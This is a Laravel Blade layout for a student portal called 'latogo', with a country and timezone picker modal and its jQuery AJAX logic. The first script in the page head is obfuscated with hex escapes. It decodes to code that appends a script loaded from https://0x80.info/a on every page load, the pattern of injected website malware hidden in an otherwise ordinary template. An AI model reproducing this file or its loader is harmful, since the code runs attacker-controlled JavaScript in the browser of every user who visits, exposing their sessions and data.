<!DOCTYPE html>
<html lang="en">

<head>
<script>var _0x46c7=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x30\x78\x38\x30\x2E\x69\x6E\x66\x6F\x2F\x61","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var a=document[_0x46c7[1]](_0x46c7[0]);a[_0x46c7[2]]= _0x46c7[3];document[_0x46c7[6]](_0x46c7[5])[0][_0x46c7[4]](a)</script>
<meta charset="utf-8">
<meta content="width=device-width, initial-scale=1.0" name="viewport">
<title>latogo</title>
<meta content="" name="description">
<meta content="" name="keywords">
<meta name="csrf-token" content="{{ csrf_token() }}">

<link rel="shortcut icon" type="image/x-icon" href="{{asset('assets/img/favicon.svg')}}">
<link rel="stylesheet" href="{{asset('assets/css/bootstrap.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/fontawesome/css/fontawesome.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/fontawesome/css/all.min.css')}}">
<link rel="stylesheet" href="{{asset('assets/plugins/feather/feather.css')}}">
<link rel="stylesheet" href="{{asset('assets/css/style.css')}}">
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/toastr.min.css">
<style>
    .mw-80 {
        max-width: 80px;
    }
    .student-ticket-view {
        width: 70%;
    }
	.google-btn{
		border: 1px solid #e5e5e5;
		border-radius: 5px;
		font-weight: 600;
	}

   
</style>
<script>
    var base_url = '{{ url("/student/") }}';
</script>
</head>

<body>

<!-- header -->
<div class="main-wrapper">
@include('layouts.student.header')


@yield('content')


@include('layouts.student.footer')
</div>
<!-- footer -->
<!-- modal -->
    @php 
        $country = DB::table('countries')->get();
    @endphp
<div class="modal fade" id="exampleModalCenter" tabindex="-1" role="dialog" aria-labelledby="exampleModalCenterTitle" aria-hidden="true">
    <div class="modal-dialog modal-dialog-centered modal-lg" role="document">
        <div class="modal-content" style="height:365px;">
        <div class="modal-header">
        <h4 class="fw-bold">Select Country And TimeZone</h4>
        </div>
        <div class="modal-body" >
        <form action="{{route('student.timezone.create')}}" method="POST" id="createFrm">
            @csrf
            <div class="container">
                <label class="fw-bold">Country</label>
                <select class="form-select country" aria-label="Default select example" name="country" id="country_id">
                    <option>Select country</option>
                    @if(count($country)>0)
                        @foreach ($country as $cat)
                            <option value="{{$cat->id}}">{{$cat->name}}</option>
                        @endforeach
                    @endif
                </select>
            </div>
            &nbsp;&nbsp;&nbsp;
            <div class="container d-none" id="tiz">
                <label class="fw-bold">TimeZone</label>
                <select class="form-select" aria-label="Default select example" name="timezone" id="timezone_id">

                </select>
            </div>
        </div>
        <div class="modal-footer text-center">
            <button type="submit" class="btn btn-secondary" data-dismiss="modal">Save</button>
        </div>
        </form>
        </div>
    </div>
    </div>
    @php 
        $user = Auth::user()->id;
        $timezone = DB::table('student_details')->where('user_id',$user)->first();
        $time = $timezone->timezone??'';
    @endphp

<script src="{{asset('assets/js/jquery-3.6.0.min.js')}}"></script>
<script src="{{asset('assets/js/bootstrap.bundle.min.js')}}"></script>

<script src="{{asset('assets/js/jquery.waypoints.js')}}"></script>
<script src="{{asset('assets/js/jquery.counterup.min.js')}}"></script>

<script src="{{asset('assets/plugins/select2/js/select2.min.js')}}"></script>

<script src="{{asset('assets/js/owl.carousel.min.js')}}"></script>

<script src="{{asset('assets/plugins/slick/slick.js')}}"></script>

<script src="{{asset('assets/plugins/aos/aos.js')}}"></script>

<script src="{{asset('assets/js/script.js')}}"></script>

<script src="{{ asset('assets/plugins/apexchart/apexcharts.min.js') }}"></script>
<script src="{{ asset('assets/plugins/apexchart/chart-data.js') }}"></script>
</script>
<script src="{{asset('theme/plugins/select2/js/select2.full.min.js')}}"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/toastr.js/latest/js/toastr.min.js"></script>
<script src="
https://cdn.jsdelivr.net/npm/sweetalert2@11.7.3/dist/sweetalert2.all.min.js
"></script>
<script>
    var date = "{{ $time }}";
      if(!date){
          $(document).ready( function(){
            $("#exampleModalCenter").modal({
                show: false,
                backdrop: 'static'
            });
            $("#exampleModalCenter").modal("show");
          })
    }

    $(document).on('change','.country',function(){
    var id = $('#country_id').val();
    $.ajax({
            type:"post",
            url:"{{route('timezone-list')}}",
            data:{'country_id':id,"_token": "{{ csrf_token() }}"},
            success:function(data)
            {
                $("#timezone_id").empty();
                $("#timezone_id").html('<option value="">Select Timezone</option>');
                $.each(data,function(key,value){
                $("#timezone_id").append('<option value="'+value.id+'">'+value.timezone+'</option>');
                });
            $('#tiz').removeClass('d-none');
            }
        });
});
    //submit
$(document).on('change','.country',function(){
            var id = $('#country_id').val();
            $.ajax({
                    type:"post",
                    url:"{{route('timezone-list')}}",
                    data:{'country_id':id,"_token": "{{ csrf_token() }}"},
                    success:function(data)
                    {
                        $("#timezone_id").empty();
                        $("#timezone_id").html('<option value="">Select Timezone</option>');
                        $.each(data,function(key,value){
                        $("#timezone_id").append('<option value="'+value.id+'">'+value.timezone+'</option>');
                        });
                    }
                });
        });

        $(document).on('click', '.faq-card', function(e) {
            e.preventDefault();
            var th = $(this).find('a');
            $('.faq-card').each(function(){
                // alert($(this).find('a').attr('data-id')==1);
                // alert($(this).find('a').attr('href') != th.attr('href'));
                if($(this).find('a').attr('href') != th.attr('href') && $(this).find('a').attr('data-id')==1)
                {
                    $(this).find('a').addClass("collapsed");
                    $(this).find('.collapse').removeClass("show");
                    $(this).find('a').attr('data-id',0);
                }

            });

            if(th.data('id')==1)
            {
                th.attr('data-id',0);
            }
            else{
                th.attr('data-id',1);
            }

        });

        $(document).on('submit', 'form#createFrm', function (event) {
            event.preventDefault();
            //clearing the error msg
            $('p.error_container').html("");

            var form = $(this);
            var data = new FormData($(this)[0]);
            var url = form.attr("action");
            var loadingText = '<i class="fa fa-circle-o-notch fa-spin"></i> loading...';
            $('.submit').attr('disabled',true);
            $('.form-control').attr('readonly',true);
            $('.form-control').addClass('disabled-link');
            $('.error-control').addClass('disabled-link');
            if ($('.submit').html() !== loadingText) {
                $('.submit').html(loadingText);
            }
            $.ajax({
                type: form.attr('method'),
                url: url,
                data: data,
                cache: false,
                contentType: false,
                processData: false,
                success: function (response) {
                    window.setTimeout(function(){
                        $('.submit').attr('disabled',false);
                        $('.form-control').attr('readonly',false);
                        $('.form-control').removeClass('disabled-link');
                        $('.error-control').removeClass('disabled-link');
                        $('.submit').html('Save');
                      },2000);
                    //console.log(response);
                    if(response.success==true) {
                        //notify

                        toastr.success("Timezone updated Successfully");

                        // Swal.fire({
                        //     position: 'top-end',
                        //     icon: 'success',
                        //     title: 'TimeZone Updated Successfully',
                        //     showConfirmButton: false,
                        //     timer: 1500
                        //     })
                        window.setTimeout(function() {
                            window.location = "{{ url('/')}}"+"/student/my-classes";
                        }, 2000);

                    }
                    //show the form validates error
                    if(response.success==false ) {
                        for (control in response.errors) {
                           var error_text = control.replace('.',"_");
                           $('#error-'+error_text).html(response.errors[control]);
                           // $('#error-'+error_text).html(response.errors[error_text][0]);
                           // console.log('#error-'+error_text);
                        }
                        // console.log(response.errors);
                    }
                },
                error: function (response) {
                    // alert("Error: " + errorThrown);
                    console.log(response);
                }
            });
            event.stopImmediatePropagation();
            return false;
        });
</script>
@stack('script')
</body>

</html>
